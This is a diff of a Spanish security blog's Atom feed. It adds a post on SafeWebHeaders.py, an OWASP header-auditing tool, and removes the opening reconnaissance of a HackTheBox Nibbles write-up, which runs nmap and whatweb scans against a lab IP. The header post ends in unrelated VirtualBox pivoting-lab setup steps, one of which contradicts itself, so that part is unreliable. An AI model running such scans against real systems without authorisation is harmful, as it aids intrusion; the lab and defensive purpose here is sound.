@@ -1,4 +1,210 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-10T01:37:50-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB forest AD</title><link href="http://localhost:4000/forest/" rel="alternate" type="text/html" title="HTB forest AD" /><published>2023-03-01T00:00:00-05:00</published><updated>2023-03-01T00:00:00-05:00</updated><id>http://localhost:4000/forest</id><content type="html" xml:base="http://localhost:4000/forest/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-11T22:21:20-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">SafeWebHeaders.py</title><link href="http://localhost:4000/safewebheaders/" rel="alternate" type="text/html" title="SafeWebHeaders.py" /><published>2023-03-10T00:00:00-05:00</published><updated>2023-03-10T00:00:00-05:00</updated><id>http://localhost:4000/safewebheaders</id><content type="html" xml:base="http://localhost:4000/safewebheaders/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/02-tarjeta.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola! En esta ocasión vamos a conocer la utilidad &lt;a href=&quot;https://raw.githubusercontent.com/Thegame008/Secure-Headers-OWASP/main/SafeWebHeaders.py&quot;&gt;SafeWebHeaders.py&lt;/a&gt; creada por &lt;a href=&quot;https://github.com/Thegame008/&quot;&gt;The Game 008&lt;/a&gt;, para auditar las cabeceras de una pagina web basada en las recomendaciones de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OWASP&lt;/code&gt; (Open Web Application Security Project).&lt;/p&gt;
+
+&lt;h2 id=&quot;cabeceras-web&quot;&gt;CABECERAS WEB&lt;/h2&gt;
+
+&lt;p&gt;Las cabeceras web, son parte de los datos que se envían desde un servidor web al cliente en una respuesta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;. Estas cabeceras &lt;strong&gt;pueden&lt;/strong&gt; contienen información adicional sobre la respuesta, incluyendo información sobre el servidor, la caché, el tipo de contenido, la codificación de caracteres, entre otros. Estas son indispensables porque permiten que los navegadores web y otros clientes logren procesar la respuesta del servidor y representar la información al usuario final.&lt;/p&gt;
+
+&lt;p&gt;Algunos de los riesgos que se pueden presentar a nivel de seguridad en cabeceras son las siguientes:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Divulgación de información&lt;/li&gt;
+  &lt;li&gt;Inyecciones de código&lt;/li&gt;
+  &lt;li&gt;Secuestros de sesiones o clicks (hijacking)&lt;/li&gt;
+  &lt;li&gt;Exposición de información confidencial&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/03-header.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;owasp&quot;&gt;OWASP&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Open Web Application Security Project&lt;/strong&gt; es una organización sin ánimo de lucro con el objetivo de mejorar la seguridad del software y las aplicaciones web. Gracias a esto se han podido identificar los riesgos de seguridad más críticos y comunes a nivel &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; y han proporcionado recursos y recomendaciones para ayudar a las comunidades a proteger sus aplicativos y páginas web.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/04-header.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;OWASP tiene una lista de los &lt;a href=&quot;https://owasp.org/www-project-top-ten/&quot;&gt;diez riesgos de seguridad más críticos en aplicaciones web&lt;/a&gt;, conocida como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OWASP Top Ten&lt;/code&gt;. Entre este top se encuentra la falta de protección adecuada en las cabeceras web.&lt;/p&gt;
+
+&lt;p&gt;A continuación, las &lt;strong&gt;recomendaciones&lt;/strong&gt; proporcionadas por OWASP para mejorar la seguridad de las aplicaciones web:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Strict-Transport-Security (HSTS)&lt;/code&gt; que obliga al navegador a utilizar solo HTTPS para las solicitudes futuras a la misma dirección web&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; que evita la incrustación no deseada de páginas web en un marco (frame) y ayuda a prevenir el clickjacking&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-XSS-Protection&lt;/code&gt; que activa una protección integrada contra ataques XSS (Cross-Site Scripting) en los navegadores modernos&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Content-Type-Options&lt;/code&gt; que evita la interpretación automática del contenido cargado para prevenir ataques MIME sniffing&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Security-Policy&lt;/code&gt; que limita los recursos que un sitio web puede cargar en su página, lo que ayuda a prevenir los ataques de inyección de código&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;instalar-safewebheaderspy&quot;&gt;INSTALAR SafeWebHeaders.py&lt;/h2&gt;
+
+&lt;p&gt;En el &lt;a href=&quot;https://github.com/Thegame008/Secure-Headers-OWASP&quot;&gt;repositorio&lt;/a&gt; puedes encontrar el paso a paso de como instalar la herramienta, sin embargo, acá tambien te mostramos el proceso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/Thegame008/Secure-Headers-OWASP.git
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Secure-Headers-OWASP
+python3 SafeWebHeaders.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/06-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;safewebheaderspy-en-acción&quot;&gt;SafeWebHeaders.py EN ACCIÓN&lt;/h2&gt;
+
+&lt;p&gt;Luego de instalar la herramienta, vamos a hacer una prueba para ver que tan seguro es nuestro blog a nivel &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 SafeWebHeaders.py
+Introduce la URL a escanear: https://bast1ant1c.github.io
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cabeceras correctamente implementadas:
+
+Cabeceras con configuración incorrecta:
+- Strict-Transport-Security:
+	- Valor recomendado por OWASP: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63072000&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; includeSubDomains&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; preload
+	- Configuración actual en la URL: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;31556952
+	- Riesgo: Vulnerabilidad a ataques de MITM
+
+Cabeceras que deberían estar implementadas, pero no se ven implementadas:
+- X-Frame-Options: SAMEORIGIN
+- X-XSS-Protection: 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;block
+- X-Content-Type-Options: nosniff
+- Content-Security-Policy: default-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; base-uri &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; img-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; data:&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; object-src &lt;span class=&quot;s1&quot;&gt;'none'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; script-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; style-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unsafe-inline'&lt;/span&gt;
+
+Divulgación de información en cabecera:
+- Server: GitHub.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como podemos evidenciar, esta utilidad nos permite identificar cabeceras correctamente implementadas, con configuración incorrecta, no implementadas y divulgación de información sensible, en esta oportunidad podemos ver que nuestro blog necesita un ajuste a nivel de cabeceras para que sea un sitio seguro.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/05-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-máquina-1&quot;&gt;CONFIGURACIÓN MÁQUINA 1&lt;/h2&gt;
+
+&lt;p&gt;Nuestra primera máquina tendrá conexión directa con la interfaz física, por lo tanto, solo requerimos de un adaptador de red en adaptador puente.&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 1&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador puente&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz&lt;/code&gt; física&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/08-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-máquina-2&quot;&gt;CONFIGURACIÓN MÁQUINA 2&lt;/h2&gt;
+
+&lt;p&gt;Nuestra segunda máquina tendrá la misma conexión con adaptador puente y otro adaptador de red para la nueva interfaz configurada anteriormente.&lt;/p&gt;
+
+&lt;h3 id=&quot;configuración-interfaz-puente&quot;&gt;CONFIGURACIÓN INTERFAZ PUENTE&lt;/h3&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 1&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador puente&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz&lt;/code&gt; física&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/09-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h3 id=&quot;configuración-interfaz-creada&quot;&gt;CONFIGURACIÓN INTERFAZ CREADA&lt;/h3&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 2&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador sólo-anfitrión&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz creada&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/10-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-máquina-3&quot;&gt;CONFIGURACIÓN MÁQUINA 3&lt;/h2&gt;
+
+&lt;p&gt;Nuestra tercera máquina tendrá conexión directa con la interfaz creada, por lo tanto, solo requerimos de un adaptador de red en adaptador sólo-anfitrión.&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 2&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador sólo-anfitrión&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz creada&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/11-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;validación-de-conexiones&quot;&gt;VALIDACIÓN DE CONEXIONES&lt;/h2&gt;
+
+&lt;p&gt;Ya tenemos el entorno configurado, ahora vamos a validar si nuestras máquinas tienen la configuración de red correcta.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/12-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver, la primera máquina tiene una dirección asociada a la primera red únicamente, la segunda máquina tiene esta misma red y adicionalmente la red nueva creada a través de la interfaz, por último, la tercera máquina se encuentra asociada a la segunda red interna, también generada por la nueva interfaz.&lt;/p&gt;
+
+&lt;h2 id=&quot;prueba-de-conectividad&quot;&gt;PRUEBA DE CONECTIVIDAD&lt;/h2&gt;
+
+&lt;p&gt;Nuestra configuración ha sido exitosa, tenemos que hacer pruebas de conectividad para corroborar que nuestras redes sean operativas, debemos tener en cuenta lo siguiente:&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 1&lt;/code&gt; solo puede tener conectividad por el mismo segmento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt; tiene conectividad por el mismo segmento de las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquinas 1 y 2&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 3&lt;/code&gt; solo puede tener conectividad por el mismo segmento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/safewebheaders/13-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Con esta configuración vamos a tener la posibilidad de crear nuevos entornos para practicar nuestros ejercicios de hacking orientados al pivoting, tema bastante importante para certificaciones como la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eCPPT&lt;/code&gt;, crear laboratorios propios nos da una ventaja en no depender de otras infraestructuras para practicar, así que esperen una corta serie pero de mucho aprendizaje en los próximos posts.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Python" /><category term="Script" /><summary type="html">Vamos a conocer la utilidad SafeWebHeaders.py creada por The Game 008 para auditar cabeceras web. ¡Let's hack!</summary></entry><entry><title type="html">HTB forest AD</title><link href="http://localhost:4000/forest/" rel="alternate" type="text/html" title="HTB forest AD" /><published>2023-03-01T00:00:00-05:00</published><updated>2023-03-01T00:00:00-05:00</updated><id>http://localhost:4000/forest</id><content type="html" xml:base="http://localhost:4000/forest/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/forest/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -3572,267 +3778,4 @@ echo.%root:~1,10%
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Optimum" /><summary type="html">Vamos a resolver la máquina Optimum de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB Nibbles</title><link href="http://localhost:4000/nibbles/" rel="alternate" type="text/html" title="HTB Nibbles" /><published>2022-10-26T00:00:00-05:00</published><updated>2022-10-26T00:00:00-05:00</updated><id>http://localhost:4000/nibbles</id><content type="html" xml:base="http://localhost:4000/nibbles/">&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/nibbles/02-tarjeta.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;¡Hola!
-En esta ocasión vamos a resolver de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nibbles&lt;/code&gt; de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
-La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
-
-&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
-
-&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nibbles&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack nibbles
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
-
-&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad &lt;a href=&quot;https://bast1ant1c.github.io/osping/&quot;&gt;osping&lt;/a&gt; detectando el tipo de sistema operativo basado en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttl&lt;/code&gt; &lt;em&gt;time to live&lt;/em&gt; de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;osping 10.10.10.75
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Detectando sistema operativo ...
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.75 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Linux
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Linux&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
-  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.75 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
-22/tcp open  ssh
-80/tcp open  http
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.75 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; versions
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento-web&quot;&gt;RECONOCIMIENTO WEB&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con el reconocimiento del puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; para identificar software que sea potencialmente vulnerable o de utilidad para nosotros.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb 10.10.10.75
-http://10.10.10.75 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.75]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Inspeccionando las peticiones con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; podemos ver un comentario que presume una ruta oculta denominada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nibbleblog&lt;/code&gt;.&lt;/p&gt;
-
